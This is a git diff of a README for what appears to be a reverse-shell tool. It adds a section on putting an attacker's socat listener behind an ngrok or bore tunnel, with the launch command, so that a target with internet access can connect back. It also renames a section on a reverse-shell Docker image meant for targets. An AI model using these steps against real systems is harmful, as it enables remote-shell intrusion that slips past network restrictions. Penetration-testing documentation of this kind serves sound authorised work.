@@ -41,6 +41,14 @@ tmux
 # 💥
 ```
 
+<details>
+<summary><h4>🎁 Bonus n°1: expose listener to the world wide web</h4></summary>
+Useful if target can't directly reach the attacker machine, but has internet access
+<br> On attacker machine, install <code>ngrok</code> or <code>bore</code> and launch your listener:
+<pre><code>
+./light-pty4all/socat-listener-behind-tunneling.sh --ngrok
+</code></pre>
+</details>
 
 ### With docker (recommended)
 
@@ -58,7 +66,7 @@ tacos.container [LISTENING_ADDR] [LISTENING_PORT] # [OPTIONAL_TACOS_ARS]
 > From a networking point of view, this is the same level of isolation as if the processes were running directly on the host and not in a container. However, in all other ways, such as storage, process namespace, and user namespace, the process is isolated from the host.
 
 <details>
-<summary><h4>🎁 Bonus: <code>tacos</code> reverse shell image</h4></summary>
+<summary><h4>🎁 Bonus n°2: <code>tacos</code> reverse shell image</h4></summary>
 Useful if target is running docker, kubernetes, etc ...
 <br> On attacker machine, launch your <code>tacos</code> listener as usual
 <br> On target:
